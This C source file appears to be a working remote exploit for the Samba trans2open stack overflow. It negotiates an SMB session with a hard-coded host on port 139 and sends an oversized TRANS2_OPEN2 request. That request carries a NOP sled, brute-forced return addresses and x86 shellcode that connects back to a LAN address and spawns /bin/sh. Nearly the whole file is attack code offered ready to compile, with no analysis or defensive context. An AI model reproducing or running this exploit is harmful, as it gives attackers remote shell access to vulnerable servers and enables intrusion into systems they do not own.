#include <arpa/inet.h>
#include <sys/socket.h>

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "./init.h"

#pragma pack(push, 1)

struct session_setup {
  NBHDR nb;
  SMBHDR hdr;
  uint8_t wc;
  uint8_t andx_command;
  uint8_t andx_pad;
  uint16_t andx_off;
  uint16_t max_buf;
  uint16_t max_mpx;
  uint16_t vc;
  uint32_t s_key;
  uint16_t old_pass_len;
  uint16_t uni_pass_len;
  uint32_t reserved;
  uint32_t caps;
};

struct tree_connect {
  NBHDR nb;
  SMBHDR hdr;
  uint8_t wc;
  uint8_t andx_command;
  uint8_t andx_pad;
  uint16_t andx_off;
  uint16_t flag;
  uint16_t pass_len;
};

struct trans2_open2 {
  NBHDR nb;
  SMBHDR hdr;

  uint8_t wc;
  uint16_t tot_param_c;
  uint16_t tot_data_c;
  uint16_t max_param_c;
  uint16_t max_data_c;
  uint8_t max_setup_c;
  uint8_t pad1;

  uint16_t param_flags;
  uint32_t timeout;
  uint16_t reserved;
  uint16_t param_c;
  uint16_t param_off;
  uint16_t data_c;
  uint16_t data_off;
  uint8_t setup_c;
  uint8_t pad2;
  uint16_t setup;

  uint16_t bc;
  uint8_t name;
  uint8_t pad[2];

  uint16_t data_flags;
  uint16_t access_mode;
  uint16_t reserved1;
  uint16_t file_attr;
  uint32_t create_time;
  uint16_t open_mode;
  uint32_t alloc_size;
  uint8_t reserved2[10];
  uint8_t EX[4000];
};

struct ret_chain {
  uint8_t jump[2];
  uint32_t ret;
};

#pragma pack()

int nbss(int sock);
int get_conn();

int get_session(int sock) {
  nbss(sock);
  usleep(100000);

  // ----------------------- Negotiate ----------------------

  uint8_t negotiate[51] = {"\x00\x00\x00\x2f\xffSMB\x72\x00\x00\x00\x00\x18\x00\x00"
                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                           "\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x02NT LM 0.12\x00"};

  send(sock, negotiate, 51, 0);
  usleep(100000);

  // ------------------------ session setup -----------------------
  uint8_t session_setup[sizeof(struct session_setup) + 15] = {0};

  struct session_setup *sess = (struct session_setup *)session_setup;
  uint8_t *sess_pl = session_setup + sizeof(struct session_setup);

  sess->nb.len = htons(sizeof(session_setup) - 4);
  memcpy(sess->hdr.proto, "\xffSMB", 4);
  sess->hdr.command = 0x73;
  sess->hdr.flag = 0x18;
  sess->wc = 0x0d;
  sess->andx_command = 0xff;
  sess->max_buf = 0xffff;
  sess->max_mpx = 0x0001;
  sess->vc = 0x0001;

  memcpy(sess_pl, "\x0d\x00", 2);
  memcpy(sess_pl + 4, "unix\x00samba\x00", 11);

  send(sock, session_setup, sizeof(session_setup), 0);
  usleep(100000);

  // ---------------------- tree connect ---------------------

  uint8_t tree_conn[sizeof(struct tree_connect) + 28] = {0};

  struct tree_connect *tree = (struct tree_connect *)tree_conn;
  uint8_t *tree_pl = tree_conn + sizeof(struct tree_connect);

  tree->nb.len = htons(sizeof(tree_conn) - 4);
  memcpy(tree->hdr.proto, "\xffSMB", 4);
  tree->hdr.command = 0x75;
  tree->hdr.flag = 0x18;
  tree->hdr.uid = 0x0064;

  tree->wc = 0x04;
  tree->andx_command = 0xff;

  memcpy(tree_pl, "\x1a\x00\\\\192.168.1.104\\IPC$\x00IPC$\x00", 28);

  send(sock, tree_conn, sizeof(tree_conn), 0);
  usleep(100000);

  return sock;
};

int main() {
  uint8_t shellcode[] = "\x6a\x01\xfe\x0c\x24\x6a\x01\x6a\x02\x6a\x66\x58\x6a\x01\x5b\x89\xe1\xcd\x80\x89\xc2\x68\xc0\xa8\x01\x07\x68\x01"
                        "\x01\x01\x01\x81\x34\x24\x03\x01\xeb\x60\x89\xe1\x6a\x10\x51\x52\x6a\x66\x58\x6a\x03\x5b\x89\xe1\xcd\x80\x89\xeb"
                        "\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01"
                        "\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80";

  // ----------------------- trans2 open2 ------------------------

  uint8_t trans2open[sizeof(struct trans2_open2)] = {0};

  struct trans2_open2 *open2 = (struct trans2_open2 *)trans2open;

  open2->nb.len = htons(sizeof(trans2open) - 4);
  memcpy(open2->hdr.proto, "\xffSMB", 4);
  open2->hdr.command = 0x32;
  open2->hdr.flag = 0x18;
  open2->hdr.tid = 0x0001;
  open2->hdr.uid = 0x0064;
  open2->wc = 0x0f;
  open2->tot_param_c = htole16(2031);
  open2->max_param_c = 0xffff;
  open2->max_data_c = 0xffff;
  open2->max_setup_c = 0xff;
  open2->param_c = htole16(2031);
  open2->param_off = htole16((uint8_t *)&open2->data_flags - (uint8_t *)&open2->hdr);
  open2->setup_c = 1;
  //                           ---- ---- ---- --+-
  open2->access_mode = htole32(0b0000000000000010);

  memset(open2->EX, 0x90, 4000);

  // Bruteforce logic

  uint32_t start = 0xbffffb00;
  uint32_t power = 50;
  uint32_t finish = 0xbfffffff;

  int offset = 0;
  for (int i = offset; i < 4; i++) {

    for (uint32_t ret = start; ret < finish; ret += power) {
      printf("Trying: %08x & %d\n", ret, offset);

      int sock = get_conn();
      if (sock < 0) {
        return -1;
      };

      get_session(sock);

      struct ret_chain chain = {0};
      chain.jump[0] = 0xeb;
      chain.jump[1] = 0x04;

      chain.ret = htonl(ret);

      uint8_t *ret_block = open2->EX + offset;

      for (int i = 0; i < 50; i += 6) {
        memcpy(ret_block + i, &chain, 6);
      };

      uint8_t *shell_block = ret_block + 6 * 50;

      memcpy(shell_block, shellcode, sizeof(shellcode));

      send(sock, trans2open, sizeof(trans2open), 0);
    };

    offset++;
  };
};

void nbios_htonb(uint8_t *in, uint8_t *out) {
  for (int i = 0; i < 16; i++) {
    out[i * 2] = (in[i] >> 4) + 0x41;
    out[i * 2 + 1] = (in[i] & 0x0f) + 0x41;
  };
};

int nbss(int sock) {
  struct packet {
    NBHDR hdr;
    uint8_t server[34];
    uint8_t client[34];
  } __attribute__((packed));

  struct packet pack = {0};

  pack.hdr.type = 0x81;

  pack.hdr.len = htons(68);

  *pack.server = 0x20;
  memcpy(pack.server + 1, "CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 32);
  *pack.client = 0x20;
  nbios_htonb((uint8_t *)"soda\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20", pack.client + 1);

  send(sock, &pack, sizeof(struct packet), 0);

  return 0;
};

int get_conn() {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    printf("socket error\n");
    return -1;
  };

  struct sockaddr_in sa = {0};

  sa.sin_port = htons(139);
  sa.sin_family = AF_INET;
  inet_pton(AF_INET, "192.168.1.104", &sa.sin_addr.s_addr);

  if (connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr_in)) < 0) {
    printf("failed to connect\n");
    return -1;
  };

  return sock;
};
